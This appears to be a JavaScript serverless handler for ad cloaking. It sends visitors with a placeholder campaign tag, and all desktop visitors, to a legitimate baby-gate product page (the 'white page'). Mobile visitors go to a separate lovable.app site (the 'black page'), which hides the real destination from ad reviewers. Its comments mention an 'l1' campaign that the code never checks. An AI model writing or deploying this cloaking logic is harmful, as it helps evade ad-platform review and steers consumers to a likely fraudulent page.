export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.babyelegance.com/products/little-locks-flat-step-safety-gate?_gl=1*1rq09s0*_up*MQ..*_ga*OTc5MTQ2NzkuMTc2MDM1ODk3NQ..*_ga_82QW7YCV3D*czE3NjAzNTg5NzUkbzEkZzAkdDE3NjAzNTg5NzUkajYwJGwwJGgyMDM5OTA3MTk3";
    const blackPageURL = "https://casssshlov.lovable.app/";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }











